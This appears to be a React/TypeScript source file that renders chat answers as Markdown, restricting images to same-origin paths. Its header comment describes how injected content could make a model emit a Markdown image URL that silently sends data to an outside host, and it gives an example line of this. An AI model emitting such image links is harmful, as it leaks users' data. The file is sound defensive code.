import type { Components } from "streamdown";

/**
 * The elements `MessageResponse` hands to streamdown (UI system phase 5b).
 *
 * streamdown draws each Markdown element with its own Tailwind classes —
 * rounded tables in a toolbar frame, a three-box code block, `**bold**` as a
 * `<span>` — written for a Tailwind build that scans its package. Ours scans
 * `src/` only, so a few of those classes happened to exist here and most did
 * not, and the result was neither streamdown's look nor ours. These plain
 * elements keep streamdown's parsing (streaming-safe, GFM, sanitised) and let
 * the page's Markdown rules (`MARKDOWN_PROSE`, DESIGN.md §8.16) draw them, so
 * an answer's list, table or code looks like a tool page's. Links are the
 * caller's (`ChatResponse`).
 *
 * **Images load from this site only** (security audit 2026-10-23). Model text
 * is shaped by tickets, web pages and manuals, and a Markdown image loads by
 * itself as the answer is drawn: `![](https://elsewhere/p.png?d=…)` would send
 * whatever the URL carries to another host with no click. So an image whose
 * source is not a same-origin path is drawn as a link the person can choose
 * to follow, never fetched.
 */
/** True for a same-origin path (`/tool-images/…`), not a protocol-relative `//host`. */
export function isSameOriginImageSrc(src: unknown): src is string {
  return typeof src === "string" && src.startsWith("/") && !src.startsWith("//") && !src.startsWith("/\\");
}

export const MESSAGE_MARKDOWN: Components = {
  img: ({ src, alt }) =>
    isSameOriginImageSrc(src) ? (
      // eslint-disable-next-line @next/next/no-img-element -- a Markdown image of unknown size, as streamdown draws it
      <img src={src} alt={alt ?? ""} loading="lazy" />
    ) : typeof src === "string" && /^https?:\/\//i.test(src) ? (
      <a href={src} target="_blank" rel="noopener noreferrer nofollow">
        {alt || src}
      </a>
    ) : (
      <span>{alt}</span>
    ),
  h1: ({ children }) => <h1>{children}</h1>,
  h2: ({ children }) => <h2>{children}</h2>,
  h3: ({ children }) => <h3>{children}</h3>,
  h4: ({ children }) => <h4>{children}</h4>,
  h5: ({ children }) => <h5>{children}</h5>,
  h6: ({ children }) => <h6>{children}</h6>,
  strong: ({ children }) => <strong>{children}</strong>,
  ul: ({ children }) => <ul>{children}</ul>,
  ol: ({ children, start }) => <ol start={start}>{children}</ol>,
  li: ({ children }) => <li>{children}</li>,
  blockquote: ({ children }) => <blockquote>{children}</blockquote>,
  hr: () => <hr />,
  // A wide table scrolls inside the answer, never the sheet.
  table: ({ children }) => (
    <div className="max-w-full overflow-x-auto">
      <table>{children}</table>
    </div>
  ),
  thead: ({ children }) => <thead>{children}</thead>,
  tbody: ({ children }) => <tbody>{children}</tbody>,
  tr: ({ children }) => <tr>{children}</tr>,
  th: ({ children }) => <th>{children}</th>,
  td: ({ children }) => <td>{children}</td>,
  pre: ({ children }) => <pre>{children}</pre>,
  code: ({ children, className }) => <code className={className}>{children}</code>,
};
